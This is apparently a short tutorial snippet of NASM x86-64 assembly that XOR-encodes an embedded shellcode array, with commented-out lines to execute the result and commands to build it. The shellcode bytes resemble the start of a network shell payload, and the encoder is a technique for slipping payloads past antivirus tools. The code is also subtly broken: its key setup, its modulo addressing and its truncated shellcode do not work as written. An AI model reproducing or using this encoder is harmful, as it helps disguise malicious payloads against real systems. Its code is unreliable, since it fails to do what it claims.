# XOR Repeater

## NASM

```nasm
section .data
    shellcode db 0x48,0x31,0xff,0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x48,0x97,0x48,0xb9
    shellcode_len equ $ - shellcode

section .bss
    key resb 10

section .text
    global _start

_start:
    ; Input your XOR key here (e.g., MySecretKey)
    mov  rdi, key
    mov  rsi, 0x0A0B0C0D0E0F1011 ; Replace with your 64-bit XOR key
    mov  rcx, 10               ; Replace 10 with the length of your key
    cld
    rep  stosb                 ; Store the key in the 'key' buffer

    ; Encoding loop
    mov  rbx, 0                ; Loop counter
encode_loop:
    mov  al, [shellcode + rbx] ; Get a byte from the shellcode
    xor  al, [key + rbx % rcx] ; XOR with the corresponding key byte
    mov  [shellcode + rbx], al ; Store the encoded byte back into the shellcode
    inc  rbx                   ; Move to the next byte
    cmp  rbx, shellcode_len    ; Check if the end of shellcode is reached
    jl   encode_loop           ; If not, continue encoding

    ; Shellcode execution (optional)
    ; Uncomment the following lines to execute the encoded shellcode
    ;lea  rdi, [shellcode]
    ;call rdi

    ; Exit the program
    mov  rax, 60               ; syscall number for exit
    xor  rdi, rdi              ; exit code 0
    syscall
```

```
$ nasm -f elf64 xor_encoder.asm -o xor_encoder.o

$ ld xor_encoder.o -o xor_encoder
```

```
; $ gcc -nostartfiles xor_encoder.o -o xor_encoder
```